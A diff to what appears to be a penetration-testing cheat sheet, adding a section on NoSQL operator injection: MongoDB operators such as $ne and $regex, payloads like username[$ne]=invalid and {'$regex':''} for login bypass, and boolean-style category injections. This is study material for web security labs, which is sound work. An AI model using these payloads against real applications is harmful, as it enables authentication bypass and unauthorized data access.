@@ -23,6 +23,22 @@ You can also remove the ```x``` end of the payload.
   2. ```category=Gifts' && 1 && 'x``` >> This will return Gift items like ```category=Gifts' and 1=1-- -``` in sql injection.
   3. ```category=Gifts' || 1 || 'x``` >> This will return all the items like ```category=Gifts' or 1=1-- -``` in sql injection.
 
+# NoSQL operator injection
+```
+    $where - Matches documents that satisfy a JavaScript expression.
+    $ne - Matches all values that are not equal to a specified value.
+    $in - Matches all of the values specified in an array.
+    $regex - Selects documents where values match a specified regular expression.
+```
+## Submitting query operators
+In JSON messages, you can insert query operators as nested objects. For example, ```{"username":"wiener"}``` becomes ```{"username":{"$ne":"invalid"}}```.
+
+For URL-based inputs, you can insert query operators via URL parameters. For example, username=wiener becomes ```username[$ne]=invalid```. If this doesn't work, you can try the following:
+
+    Convert the request method from GET to POST.
+    Change the Content-Type header to application/json.
+    Add JSON to the message body.
+    Inject query operators in the JSON.
 # MongoDB Login Bypass
 ```
 {"$regex":""} >> For username
